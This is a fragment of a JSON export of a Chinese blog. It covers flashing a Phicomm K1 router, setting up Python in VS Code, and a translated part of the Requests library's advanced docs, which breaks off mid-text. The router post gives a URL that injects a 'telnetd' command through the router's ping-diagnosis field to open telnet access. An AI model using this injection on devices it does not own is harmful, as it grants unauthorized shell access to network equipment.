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\" data-src=\"http://7xusrl.com1.z0.glb.clouddn.com/k1basicSetting.png\" alt=\"k1basicSetting\" /\u003e\u003c/p\u003e\n\n\u003ch2\u003e2.在浏览器地址栏输入：\u003ca href=\"http://192.168.2.1/goform/Diagnosis?pingAddr=192.168.2.100|echo\u0026quot;\u0026quot;|telnetd\"\u003ehttp://192.168.2.1/goform/Diagnosis?pingAddr=192.168.2.100|echo\u0026quot;\u0026quot;|telnetd\u003c/a\u003e\u003c/h2\u003e\n\n\u003cp\u003e(如果你的电脑ip不是192.168.2.100,请改成你电脑的ip(内网ip))\u003c/p\u003e\n","title":"给斐讯K1刷机并拨号e信(湖北地区测试无问题)"},{"content":"\n\n\n\n# 1.安装Python插件\n\n在VScode界面按`Crtl`+`Shift`+`P`或者`F1`\n\n输入`ext install`\n\n![ext install](http://7xusrl.com1.z0.glb.clouddn.com/ext%20install.png)\n\n直接安装`Python`，也就是点击它，然后等待，安装好后会提示你重启\n\n\n# 2.配置运行Python程序\n\n同样的打开命令面板（`Crtl`+`Shift`+`P`或`F1`），然后输入`Tasks: Configure Task Runner`（中文输入：任务，然后选择任务：配置任务运行程序），选择`Other`\n\n此时VScode会自动生成.vscode文件夹并生成一个默认的task.json\n\n![tasks.json](http://7xusrl.com1.z0.glb.clouddn.com/vscode-tasks.json.png)\n\n配置如下\n\n\n    \"version\": \"0.1.0\",\n    \"command\": \"python\",\n    \"isShellCommand\": true,\n    \"args\": [\"${file}\"],\n    \"showOutput\": \"always\"\n\n然后写完代码后\n`Crtl`+`Shift`+`B`运行Py程序\n![python-run](http://7xusrl.com1.z0.glb.clouddn.com/VScode-python-run.png)\n","cover":"","link":"2016/06/29/visual-studio-code配置python开发环境.html","preview":"\u003ch1\u003e1.安装Python插件\u003c/h1\u003e\n\n\u003cp\u003e在VScode界面按\u003ccode\u003eCrtl\u003c/code\u003e+\u003ccode\u003eShift\u003c/code\u003e+\u003ccode\u003eP\u003c/code\u003e或者\u003ccode\u003eF1\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003e输入\u003ccode\u003eext install\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003cimg src=\"data:image/gif;base64,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\" data-src=\"http://7xusrl.com1.z0.glb.clouddn.com/ext%20install.png\" alt=\"ext install\" /\u003e\u003c/p\u003e\n\n\u003cp\u003e直接安装\u003ccode\u003ePython\u003c/code\u003e，也就是点击它，然后等待，安装好后会提示你重启\u003c/p\u003e\n","title":"Visual Studio Code配置Python开发环境"},{"content":"\n\n\n\n-----------\n# 高级用法\n-----------\n\n本篇文档涵盖了Requests的一些更加高级的特性。\n\n-----------\n## 会话对象\n------------\n\n会话对象让你能够跨请求保持某些参数。它也会在同一个Session实例发出的所有请求之间保持cookies。\n\n会话对象具有主要的Requests API的所有方法。\n\n我们来跨请求保持一些cookies:\n\n```python\ns = requests.Session()\n\ns.get('http://httpbin.org/cookies/set/sessioncookie/123456789')\nr = s.get(\"http://httpbin.org/cookies\")\n\nprint(r.text)\n# '{\"cookies\": {\"sessioncookie\": \"123456789\"}}'\n```\n\n\n\n会话也可用来为请求方法提供缺省数据。这是通过为会话对象的属性提供数据来实现的:\n\n```python\ns = requests.Session()\ns.auth = ('user', 'pass')\ns.headers.update({'x-test': 'true'})\n\n# both 'x-test' and 'x-test2' are sent\ns.get('http://httpbin.org/headers', headers={'x-test2': 'true'})\n```\n\n任何你传递给请求方法的字典都会与已设置会话层数据合并。方法层的参数覆盖会话的参数。\n\n\u003e **从字典参数中移除一个值**\n\u003e有时你会想省略字典参数中一些会话层的键。要做到这一点，你只需简单地在方法层参数中将那个键的值设置为 None ，那个键就会被自动省略掉。\n\n包含在一个会话中的所有数据你都可以直接使用。学习更多细节请阅读 [会话API文档](http://cn.python-requests.org/zh_CN/latest/api.html#sessionapi) 。\n\n-----------\n## 请求与响应对象\n--------------\n\n任何时候调用requests.*()你都在做两件主要的事情。其一，你在构建一个 Request 对象， 该对象将被发送到某个服务器请求或查询一些资源。其二，一旦 requests 得到一个从 服务器返回的响应就会产生一个 Response 对象。该响应对象包含服务器返回的所有信息， 也包含你原来创建的 Request 对象。如下是一个简单的请求，从Wikipedia的服务器得到 一些非常重要的信息:\n\n```python\n\u003e\u003e\u003e r = requests.get('http://en.wikipedia.org/wiki/Monty_Python')\n```\n\n如果想访问服务器返回给我们的响应头部信息，可以这样做:\n\n```python\n\u003e\u003e\u003e r.headers\n{'content-length': '56170', 'x-content-type-options': 'nosniff', 'x-cache':\n'HIT from cp1006.eqiad.wmnet, MISS from cp1010.eqiad.wmnet', 'content-encoding':\n'gzip', 'age': '3080', 'content-language': 'en', 'vary': 'Accept-Encoding,Cookie',\n'server': 'Apache', 'last-modified': 'Wed, 13 Jun 2012 01:33:50 GMT',\n'connection': 'close', 'cache-control': 'private, s-maxage=0, max-age=0,\nmust-revalidate', 'date': 'Thu, 14 Jun 2012 12:59:39 GMT', 'content-type':\n'text/html; charset=UTF-8', 'x-cache-lookup': 'HIT from cp1006.eqiad.wmnet:3128,\nMISS from cp1010.eqiad.wmnet:80'}\n```\n\n然而，如果想得到发送到服务器的请求的头部，我们可以简单地访问该请求，然后是该请求的头部:\n\n```python\n\u003e\u003e\u003e r.request.headers\n{'Accept-Encoding': 'identity, deflate, compress, gzip',\n'Accept': '*/*', 'User-Agent': 'python-requests/0.13.1'}\n```\n\n----------\n## Prepared Request\n----------\n\n当你从API调用或Session调用得到一个[Response](http://cn.python-requests.org/zh_CN/latest/api.html#requests.Response)对象，对于这个的request属性实际上是被使用的PreparedRequest，在某些情况下你可能希望在发送请求之前对body和headers(或其他东西)做些额外的工作，一个简单的例子如下:\n\n```python\nfrom requests import Request, Session\n\ns = Session()\nreq = Request('GET', url,\n    data=data,\n    headers=header\n)\nprepped = req.prepare()\n\n# do something with prepped.body\n# do something with prepped.headers\n\nresp = s.send(prepped,\n    stream=stream,\n    verify=verify,\n    proxies=proxies,\n    cert=cert,\n    timeout=timeout\n)\n\nprint(resp.status_code)\n```\n\n因为你没有用Request对象做任何特别的事情，你应该立即封装它和修改 PreparedRequest 对象，然后携带着你想要发送到requests.* 或 Session.*的其他参数来发送它\n\n但是，上面的代码会丧失一些Requests Session对象的优势，特别的，Session层的状态比如cookies不会被应用到你的其他请求中，要使它得到应用，你可以用*Session.prepare_request()*来替换 *Request.prepare()*，比如下面的例子:\n\n```python\nfrom requests import Request, Session\n\ns = Session()\nreq = Request('GET',  url,\n    data=data\n    headers=headers\n)\n\nprepped = s.prepare_request(req)\n\n# do something with prepped.body\n# do something with prepped.headers\n\nresp = s.send(prepped,\n    stream=stream,\n    verify=verify,\n    proxies=proxies,\n    cert=cert,\n    timeout=timeout\n)\n\nprint(resp.status_code)\n```\n\n------------\n## SSL证书验证\n------------\n\nRequests可以为HTTPS请求验证SSL证书，就像web浏览器一样。要想检查某个主机的SSL证书，你可以使用 verify 参数:\n\n```python\n\u003e\u003e\u003e requests.get('https://kennethreitz.com', verify=True)\nrequests.exceptions.SSLError: hostname 'kennethreitz.com' doesn't match either of '*.herokuapp.com', 'herokuapp.com'\n```\n\n在该域名上我没有设置SSL，所以失败了。但Github设置了SSL:\n\n```python\n\u003e\u003e\u003e requests.get('https://github.com', verify=True)\n\u003cResponse [200]\u003e\n```\n\n对于私有证书，你也可以传递一个*CA_BUNDLE*文件的路径给 **verify** 。你也可以设置 *REQUEST_CA_BUNDLE* 环境变量。\n\n如果你将**verify**设置为**False**，Requests也能**忽略**对SSL证书的验证。\n\n```python\n\u003e\u003e\u003e requests.get('https://kennethreitz.com', verify=False)\n\u003cResponse [200]\u003e\n```\n\n**默认**情况下， **verify** 是设置为**True**的。选项 verify 仅应用于主机证书。\n\n你也可以指定一个本地证书用作客户端证书，可以是单个文件（包含密钥和证书）或一个包含两个文件路径的元组:\n\n```python\n\u003e\u003e\u003e requests.get('https://kennethreitz.com', cert=('/path/server.crt', '/path/key'))\n\u003cResponse [200]\u003e\n```\n\n如果你指定了一个错误路径或一个无效的证书:\n\n```python\n\u003e\u003e\u003e requests.get('https://kennethreitz.com', cert='/wrong_path/server.pem')\nSSLError: [Errno 336265225] _ssl.c:347: error:140B0009:SSL routines:SSL_CTX_use_PrivateKey_file:PEM lib\n```\n\n--------------\n## 响应体内容工作流\n--------------\n\n默认情况下，当你进行网络请求后，响应体会**立即**被下载。你可以通过 **stream** 参数覆盖这个行为，**推迟**下载响应体直到访问 **Response.content** 属性:\n\n```python\ntarball_url = 'https://github.com/kennethreitz/requests/tarball/master'\nr = requests.get(tarball_url, stream=True)\n```\n\n此时仅有响应头被下载下来了，**连接保持打开状态**，因此允许我们根据条件获取内容:\n\n```python\nif int(r.headers['content-length']) \u003c TOO_LONG:\n    content = r.content\n    ...\n```\n\n你可以进一步使用 [Response.iter_content](http://cn.python-requests.org/zh_CN/latest/api.html#requests.Response.iter_content) 和 [Response.iter_lines](http://cn.python-requests.org/zh_CN/latest/api.html#requests.Response.iter_lines) 方法来控制工作流，或者以 [Response.raw](http://cn.python-requests.org/zh_CN/latest/api.html#requests.Response.raw) 从底层urllib3的 urllib3.HTTPResponse \u003curllib3.response.HTTPResponse 读取。\n\n如果当你请求时设置**stream**为**True**，Requests将不能释放这个连接为连接池，除非你读取了全部数据或者调用了**Response.close**，这样会使连接变得低效率。如果当你设置 **stream = True** 时你发现你自己部分地读取了响应体数据(或者完全没读取响应体数据)，你应该考虑使用[***contextlib.closing***](http://docs.python.org/2/library/contextlib.html#contextlib.closing),比如下面的例子:\n\n```python\nfrom contextlib import closing\n\nwith closing(requests.get('http://httpbin.org/get', stream=True)) as r:\n    # Do things with the response here.\n```\n\n------------\n## 保持活动状态（持久连接）\n-----------\n\n好消息 - 归功于urllib3，**同一会话内的持久连接是完全自动处理的！同一会话内你发出的任何请求都会自动复用恰当的连接！**\n\n\u003e**注意**：只有所有的响应体数据被读取完毕连接才会被释放为连接池；所以确保将 **stream** 设置为 **False** 或读取 **Response** 对象的 **content** 属性。\n\n--------------\n## 流式上传\n--------------\n\nRequests支持流式上传，这允许你发送大的数据流或文件而无需先把它们读入内存。要使用流式上传，仅需为你的请求体提供一个类文件对象即可:\n\n```python\nwith open('massive-body') as f:\n    requests.post('http://some.url/streamed', data=f)\n```\n\n--------\n## 块编码请求\n-------\n\n对于出去和进来的请求，Requests也支持分块传输编码。要发送一个块编码的请求，仅需为你的请求体提供一个生成器（或任意没有具体长度(without a length)的迭代器）:\n\n```python\ndef gen():\n    yield 'hi'\n    yield 'there'\n\nrequests.post('http://some.url/chunked', data=gen())\n```\n\n-----------\n## POST 多个编码(Multipart-Encoded)文件\n-----------\n\n你可以在一个请求中发送多个文件，例如，假设你希望上传图像文件到一个包含多个文件字段‘images’的HTML表单\n\n```html\n\u003cinput type=”file” name=”images” multiple=”true” required=”true”/\u003e\n```\n\n达到这个目的，仅仅只需要设置文件到一个包含(*form_field_name*, *file_info*)的元组的**列表**：\n\n```python\n\u003e\u003e\u003e url = 'http://httpbin.org/post'\n\u003e\u003e\u003e multiple_files = [('images', ('foo.png', open('foo.png', 'rb'), 'image/png')),\n                      ('images', ('bar.png', open('bar.png', 'rb'), 'image/png'))]\n\u003e\u003e\u003e r = requests.post(url, files=multiple_files)\n\u003e\u003e\u003e r.text\n{\n  ...\n  'files': {'images': 'data:image/png;base64,iVBORw ....'}\n  'Content-Type': 'multipart/form-data; boundary=3131623adb2043caaeb5538cc7aa0b3a',\n  ...\n}\n```\n\n--------\n## 事件挂钩\n--------\n\nRequests有一个钩子系统，你可以用来操控部分请求过程，或信号事件处理。\n\n可用的钩子:\n\n*response:*\n\n  从一个请求产生的响应\n\n你可以通过传递一个 *{hook_name: callback_function}* 字典给 hooks 请求参数 为每个请求分配一个钩子函数:\n\n```python\nhooks=dict(response=print_url)\n```\n\n*callback_function* 会接受一个数据块作为它的第一个参数。\n\n```python\ndef print_url(r):\n    print(r.url)\n```\n\n若执行你的回调函数期间发生错误，系统会给出一个警告。\n\n若回调函数返回一个值，默认以该值替换传进来的数据。若函数未返回任何东西， 也没有什么其他的影响。\n\n我们来在运行期间打印一些请求方法的参数:\n\n```python\n\u003e\u003e\u003e requests.get('http://httpbin.org', hooks=dict(response=print_url))\nhttp://httpbin.org\n\u003cResponse [200]\u003e\n```\n\n---------\n## 自定义身份验证\n---------\n\nRequests允许你使用自己指定的身份验证机制。\n\n任何传递给请求方法的 ***auth*** 参数的可调用对象，在请求发出之前都有机会修改请求。\n\n自定义的身份验证机制是作为 *requests.auth.AuthBase* 的子类来实现的，也非常容易定义。\n\nRequests在 *requests.auth* 中提供了两种常见的的身份验证方案： *HTTPBasicAuth* 和 *HTTPDigestAuth* 。\n\n假设我们有一个web服务，仅在 X-Pizza 头被设置为一个密码值的情况下才会有响应。虽然这不太可能， 但就以它为例好了\n\n```python\nfrom requests.auth import AuthBase\n\nclass PizzaAuth(AuthBase):\n    \"\"\"Attaches HTTP Pizza Authentication to the given Request object.\"\"\"\n    def __init__(self, username):\n        # setup any auth-related data here\n        self.username = username\n\n    def __call__(self, r):\n        # modify and return the request\n        r.headers['X-Pizza'] = self.username\n        return r\n```\n\n然后就可以使用我们的***PizzaAuth***来进行网络请求:\n\n```python\n\u003e\u003e\u003e requests.get('http://pizzabin.org/admin', auth=PizzaAuth('kenneth'))\n\u003cResponse [200]\u003e\n```\n\n--------\n## 流式请求\n--------\n\n使用 [requests.Response.iter_lines()](http://cn.python-requests.org/zh_CN/latest/api.html#requests.Response.iter_lines) 你可以很方便地对流式API（例如 [Twitter的流式API](https://dev.twittercom/docs/streaming-api) ）进行迭代。简单地设置 stream 为 True 便可以使用 [iter_lines()](http://cn.python-requests.org/zh_CN/latest/api.html#requests.Response.iter_lines) 对相应进行迭代:\n\n```python\nimport json\nimport requests\n\nr = requests.get('http://httpbin.org/stream/20', stream=True)\n\nfor line in r.iter_lines():\n\n    # filter out keep-alive new lines\n    if line:\n        print(json.loads(line))\n```\n\n------------\n## 代理\n-----------\n\n如果需要使用代理，你可以通过为任意请求方法提供 ***proxies*** 参数来配置单个请求:\n\n```python\nimport requests\n\nproxies = {\n  \"http\": \"http://10.10.1.10:3128\",\n  \"https\": \"http://10.10.1.10:1080\",\n}\n\nrequests.get(\"http://example.org\", proxies=proxies)\n```\n\n你也可以通过环境变量 *HTTP_PROXY* 和 *HTTPS_PROXY* 来配置代理。\n```bash\n$ export HTTP_PROXY=\"http://10.10.1.10:3128\"\n$ export HTTPS_PROXY=\"http://10.10.1.10:1080\"\n$ python\n```\n```python\n\u003e\u003e\u003e import requests\n\u003e\u003e\u003e requests.get(\"http://example.org\")\n```\n\n若你的代理需要使用**HTTP Basic Auth**，可以使用 ***http://user:password@host/ 语法***:\n\n```python\nproxies = {\n    \"http\": \"http://user:pass@10.10.1.10:3128/\",\n}\n```\n\n--------------\n## 合规性\n--------------\n\nRequests符合所有相关的规范和RFC，这样不会为用户造成不必要的困难。但这种对规范的考虑 导致一些行为对于不熟悉相关规范的人来说看似有点奇怪。\n\n### 编码方式\n\n当你收到一个响应时，Requests会猜测响应的编码方式，用于在你调用 Response.text 方法时 对响应进行解码。Requests首先在HTTP头部检测是否存在指定的编码方式，如果不存在，则会使用 charade 来尝试猜测编码方式。\n\n只有当HTTP头部不存在明确指定的字符集，并且 Content-Type 头部字段包含 text 值之时， Requests才不去猜测编码方式。\n\n在这种情况下， RFC 2616 指定默认字符集 必须是 ISO-8859-1 。Requests遵从这一规范。如果你需要一种不同的编码方式，你可以手动设置 Response.encoding 属性，或使用原始的 Response.content 。**(可结合上一篇安装使用快速上手中的 *响应内容* 学习)**\n\n---------\n## HTTP请求类型(附加例子)\n---------\n\nRequests提供了几乎所有HTTP请求类型的功能：GET，OPTIONS， HEAD，POST，PUT，PATCH和DELETE。 以下内容为使用Requests中的这些请求类型以及Github API提供了**详细示例**。\n\n我将从最常使用的请求类型GET开始。HTTP GET是一个幂等的方法，从给定的URL返回一个资源。因而， 当你试图从一个web位置获取数据之时，你应该使用这个请求类型。一个使用示例是尝试从Github上获取 关于一个特定commit的信息。假设我们想获取Requests的commit a050faf 的信息。我们可以 这样去做:\n\n```python\n\u003e\u003e\u003e import requests\n\u003e\u003e\u003e r = requests.get('https://api.github.com/repos/kennethreitz/requests/git/commits/a050faf084662f3a352dd1a941f2c7c9f886d4ad')\n```\n\n我们应该确认Github是否正确响应。如果正确响应，我们想弄清响应内容是什么类型的。像这样去做:\n\n```python\n\u003e\u003e\u003e if (r.status_code == requests.codes.ok):\n...     print r.headers['content-type']\n...\napplication/json; charset=utf-8\n```\n\n可见，GitHub返回了JSON数据，非常好，这样就可以使用 **r.json** 方法把这个返回的数据解析成Python对象。\n\n```python\n\u003e\u003e\u003e commit_data = r.json()\n\u003e\u003e\u003e print commit_data.keys()\n[u'committer', u'author', u'url', u'tree', u'sha', u'parents', u'message']\n\u003e\u003e\u003e print commit_data[u'committer']\n{u'date': u'2012-05-10T11:10:50-07:00', u'email': u'me@kennethreitz.com', u'name': u'Kenneth Reitz'}\n\u003e\u003e\u003e print commit_data[u'message']\nmakin' history\n```\n\n到目前为止，一切都非常简单。嗯，我们来研究一下GitHub的API。我们可以去看看文档， 但如果使用Requests来研究也许会更有意思一点。我们可以借助Requests的OPTIONS请求类型来看看我们刚使用过的url 支持哪些HTTP方法。\n\n```python\n\u003e\u003e\u003e verbs = requests.options(r.url)\n\u003e\u003e\u003e verbs.status_code\n500\n```\n\n额，这是怎么回事？毫无帮助嘛！原来GitHub，与许多API提供方一样，实际上并未实现OPTIONS方法。 这是一个恼人的疏忽，但没关系，那我们可以使用枯燥的文档。然而，如果GitHub正确实现了OPTIONS， 那么服务器应该在响应头中返回允许用户使用的HTTP方法，例如：\n\n```python\n\u003e\u003e\u003e verbs = requests.options('http://a-good-website.com/api/cats')\n\u003e\u003e\u003e print verbs.headers['allow']\nGET,HEAD,POST,OPTIONS\n```\n\n转而去查看文档，我们看到对于提交信息，另一个允许的方法是POST，它会创建一个新的提交。 由于我们正在使用Requests代码库，我们应尽可能避免对它发送笨拙的POST。作为替代，我们来 玩玩GitHub的Issue特性。\n\n本篇文档是回应*Issue #482*而添加的。鉴于该问题已经存在，我们就以它为例。先获取它。\n\n```python\n\u003e\u003e\u003e r = requests.get('https://api.github.com/repos/kennethreitz/requests/issues/482')\n\u003e\u003e\u003e r.status_code\n200\n\u003e\u003e\u003e issue = json.loads(r.text)\n\u003e\u003e\u003e print issue[u'title']\nFeature any http verb in docs\n\u003e\u003e\u003e print issue[u'comments']\n3\n```\n\nCool，有3个评论。我们来看一下最后一个评论。\n\n```python\n\u003e\u003e\u003e r = requests.get(r.url + u'/comments')\n\u003e\u003e\u003e r.status_code\n200\n\u003e\u003e\u003e comments = r.json()\n\u003e\u003e\u003e print comments[0].keys()\n[u'body', u'url', u'created_at', u'updated_at', u'user', u'id']\n\u003e\u003e\u003e print 